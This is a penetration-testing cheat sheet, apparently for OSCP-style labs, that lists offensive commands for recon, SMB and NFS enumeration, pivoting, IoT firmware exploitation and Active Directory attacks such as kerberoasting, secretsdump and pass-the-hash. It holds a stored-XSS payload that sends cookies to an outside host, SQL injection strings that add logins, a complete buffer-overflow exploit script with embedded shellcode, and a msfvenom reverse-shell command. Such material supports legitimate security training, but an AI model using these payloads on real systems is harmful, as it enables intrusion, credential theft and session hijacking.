# Basic Commands and Techniques

---

### <u>1. Recon </u>

- Nmap - General Scan
  

```bash
nmap -Pn -T5 -sC -sV -oN InitialScan_NMAP <IP> # General Scan
```

- Nmap - Full Scan
  

```bash
nmap -Pn -p- -oN All_Ports_Nmap <IP> --min-rate=10000 # Full Scan
```

- Rustscan
  

```bash
rustscan -a <IP>
```

- Nikto
  

```bash
nikto -h http://IP 
```

- Finger - User enum
  

```bash
finger @ IP
finger admin @ IP
```

- Scan Table
  

|     | 10.10.10.10 | 20.20.20.20 |
| --- | --- | --- |
| **OS** | Windows 7 | Linux |
| **Ports** | 3389 | 22,80 |
| **Services** | RDP | SSH, HTTP |
| **Vulns** |     |     |
| **Exploits** |     |     |
| **Notes** |     |     |
| **Priority** |     |     |

---

### <u>2. External</u>

- FTP
  

```bash
ftp <IP> #username = anonymous and password blank
=> put file.txt #upload
=> get file.txt #Download
```

- CMS - Wordpress
  

```bash
wpscan --url http://IP -e u p 
```

---

### <u>3. Internal</u>

- Ping Sweep
  

```bash
sudo netdiscover
netdiscover -i eth0 -p #passive - takes time
netdiscover -i eth0 -r IP subnet
nmap -sP IP #Ping Sweep


for i in $(seq 254);do ping 10.10.10.${i} -c1 -W1;done | grep from
```

- Db_Nmap
  

```bash
sudo msfdb init
workspaces -a #Lists all workspaces
db_nmap -sS IP #General Scaning methods
Hosts
Services
```

- SMB - Samba
  

```bash
nmap --script smb-os-discovery IP
smbclient -L \\\\IP\\share -N 
smbmap -H IP -U username -P Password -d domain.htb
enum4linux -a IP
```

- RPC and NFS
  

```bash
showmount -e IP
sudo mount -t nfs IP:/path /created_dir -o nolock
```

---

### <u>4. Pivoting</u>

- Chisel
  

```bash
#Attacker Machine
chisel server --socks5 --reverse

#Victim Machine - Just a single port frwd
chisel client --fingerprint <That Hash> <Attacker IP : Listen Port> R:New_Listen_port:Victim IP:Victim Port


chisel client --fingerprint <That Hash> <Attacker IP : Listen Port> R:socks
```

- RDP
  

```bash
xfreerdp /v:Victim_IP /u:Administrator
proxychains xfreerdp /v:Victim_IP /u:Administrator #If pivot
```

---

### <u>5. IOT</u>

| Description | Command |
| --- | --- |
| Identify the filetype | file firmware.bin |
| gather the hexdump | hexdump -c firmware.bin \| more => qshs = squashfs |
| Extract the fireware | binwalk -e firmware.bin |
| Firmadyne Extracting the firmware | sudo python3 sources/extractor/extractor.py -b Netgear -sql 127.0.0.1 -np -nk "WNAP320 Firmware Version 2.0.3.zip" images |
| Get the architecture of the firmware | sudo bash scripts/getArch.sh images/1.tar.gz. |
| load the contents of the filesystem for firmware 1 into the database and populate the object and object_to_image tables | sudo python3 scripts/tar2db.py -i 1 -f images/1.tar.gz. |
| Configure the Network | sudo bash scripts/inferNetwork.sh |
| Execute the script | sudo bash scratch/1/run.sh. |
| Extract Data using SNMP | sudo bash analyses/snmpwalk.sh 192.168.0.100 |
| Make a new folder and try these exploits | sudo chmod +x analyses/runExploits.py.<br/>sudo python analyses/runExploits.py -t 192.168.0.100 -o exploits/exploit -e x. |

---

### <u>6. Web Vulns</u>

| Description | Command |
| --- | --- |
| Stored XSS, Cookie Steal Script | #####<a onclick="document.location='http://www.oceanplaza.com/Default.aspx?cookie='+escape(document.cookie);" href=#> trust me </ar> |
| IDOR | Visit Profile Pages or any other pages and change the ID |
| SQLI | Sqlmap -r for_sql.req --dumps --tables<br/><br/><br/>Sqlmap -u 'domain' -X POST --data "<Paste the Request>" --dumps --tables<br/><br/>admin' OR 1=1 --<br/><br/>admin' ;insert into login values('superman','superman123');--<br/><br/>admin' ;create database kryptonite;-- |

---

### 7. Active Directory

- Group Policy Hash
  

```bash
gpp-decrypt <hash> # Group Policy XML Hash
```

- BloodHound Ingestor and neo4j
  

```bash
bloodhound-python --dns-tcp -ns <Victim_IP> -d domain.htb -u username -p password

#Start Bloodhound
Terminal 1: neo4j console
Terminal 2: bloodhound
```

- Kerberoasting - 2 Ways
  

```bash
1. GetNPUsers.py -no-pass -usersfile users.txt -dc-ip <victimIP> domain.htb/
2. GetNPUsers.py -request -dc-ip <victimIP> domain.htb/
3. GetUserSPNs.py -request -dc-ip <victimIP> domain.htb/username
```

- psexec.py
  

```bash
psexec.py domain.htb/username@IP
```

- SecretsDump.py
  

```bash
secretsdump.py -just-dc username@IP
```

- Evil-WinRM
  

```bash
evil-winrm -i IP -u Administrator -H Hash
```

- Crackmapexec
  

```bash
crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
```

---

### 8. Buffer Overflow

- Basic Script

```python
#!/usr/bin/env python3

import socket
import struct
import time

ip,port = "192.168.0.107",1337

command = b"OVERFLOW1 "
full_len = 5000
offset = 1978


badchars = (
  b"\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
  b"\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

jump = struct.pack("<I",0x625011AF)
nop = b"\x90" * 24

shellcode =  b""
shellcode += b"\xba\xfa\xb6\x1c\x40\xdb\xca\xd9\x74\x24\xf4"
shellcode += b"\x5e\x2b\xc9\xb1\x59\x31\x56\x14\x83\xc6\x04"
shellcode += b"\x03\x56\x10\x18\x43\xe0\xa8\x53\xac\x19\x29"
shellcode += b"\x0b\x9c\xcb\x4d\x40\x8c\xdb\x04\xb3\xba\x4e"
shellcode += b"\x1b\xb0\xef\x7a\xa8\xb4\x27\x8c\x19\x72\x1e"
shellcode += b"\xa3\x9a\xb3\x9e\x6f\x58\xd2\x62\x72\x8d\x34"
shellcode += b"\x5a\xbd\xc0\x35\x9b\x0b\xae\xda\x71\xdb\xdb"
shellcode += b"\x76\x66\x68\x99\x4a\x87\xbe\x95\xf2\xff\xbb"
shellcode += b"\x6a\x86\xb3\xc2\xba\xed\x04\xdd\xb1\xa9\xb4"
shellcode += b"\xdc\x16\x19\x30\x17\xec\xa5\x0b\x57\x44\x5e"
shellcode += b"\x5f\x2c\x56\xb6\x91\xf2\x98\xf9\xdf\x5e\x1b"
shellcode += b"\xc2\xd8\x7e\x69\x38\x1b\x02\x6a\xfb\x61\xd8"
shellcode += b"\xff\x1b\xc1\xab\x58\xff\xf3\x78\x3e\x74\xff"
shellcode += b"\x35\x34\xd2\x1c\xcb\x99\x69\x18\x40\x1c\xbd"
shellcode += b"\xa8\x12\x3b\x19\xf0\xc1\x22\x38\x5c\xa7\x5b"
shellcode += b"\x5a\x38\x18\xfe\x11\xab\x4f\x7e\xda\x33\x70"
shellcode += b"\x22\x4c\xff\xbd\xdd\x8c\x97\xb6\xae\xbe\x38"
shellcode += b"\x6d\x39\xf2\xb1\xab\xbe\x83\xd6\x4b\x10\x2b"
shellcode += b"\xb6\xb5\x91\x4b\x9e\x71\xc5\x1b\x88\x50\x66"
shellcode += b"\xf0\x48\x5c\xb3\x6c\x43\xca\xfc\xd8\x53\x66"
shellcode += b"\x95\x1a\x54\x67\x39\x93\xb2\xd7\x91\xf3\x6a"
shellcode += b"\x98\x41\xb3\xda\x70\x88\x3c\x04\x60\xb3\x97"
shellcode += b"\x2d\x0b\x5c\x41\x05\xa4\xc5\xc8\xdd\x55\x09"
shellcode += b"\xc7\x9b\x56\x81\xed\x5c\x18\x62\x84\x4e\x4d"
shellcode += b"\x15\x66\x8f\x8e\xb0\x66\xe5\x8a\x12\x31\x91"
shellcode += b"\x90\x43\x75\x3e\x6a\xa6\x06\x39\x94\x37\x3e"
shellcode += b"\x31\xa3\xad\x7e\x2d\xcc\x21\x7e\xad\x9a\x2b"
shellcode += b"\x7e\xc5\x7a\x08\x2d\xf0\x84\x85\x42\xa9\x10"
shellcode += b"\x26\x32\x1d\xb2\x4e\xb8\x78\xf4\xd0\x43\xaf"
shellcode += b"\x86\x17\xbb\x2d\xa1\xbf\xd3\xcd\xf1\x3f\x23"
shellcode += b"\xa4\xf1\x6f\x4b\x33\xdd\x80\xbb\xbc\xf4\xc8"
shellcode += b"\xd3\x37\x99\xbb\x42\x47\xb0\x1a\xda\x48\x37"
shellcode += b"\x87\xed\x33\x38\x38\x0e\xc4\x50\x5d\x0f\xc4"
shellcode += b"\x5c\x63\x2c\x12\x65\x11\x73\xa6\xd2\x2a\xc6"
shellcode += b"\x8b\x73\xa1\x28\x9f\x84\xe0"



payload = b"".join([
	command,
	b"A" * offset,
	# b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co",
	jump,
	nop,
	shellcode,
	b"C" * (full_len - offset - len(jump) - len(nop) - len(shellcode)),
	])
		
with socket.socket() as s:
	s.connect((ip,port))
	print("[*] Fuzzing Phase...")
	print("[*] Offset Found : 1978")
	print("[*] Finding Bad Chars...")
	print("[*] Bad Chars : 0x00 0x07 0x2e 0x2f 0xa0 0xa1")
	print("[*] Added NOPS")
	print("[*] Added Shellcode...")
	s.send(payload)

```

- Mona scripts

```bash
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00" => Run => !mona compare -f C:\mona\oscp\bytearray.bin -a address
!mona jmp -r esp -cpb "bad chars" abd check log data tab
```
- Msf payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=4444 -b "\x00\x07\x2e\xa0" -f py -v shellcode
```
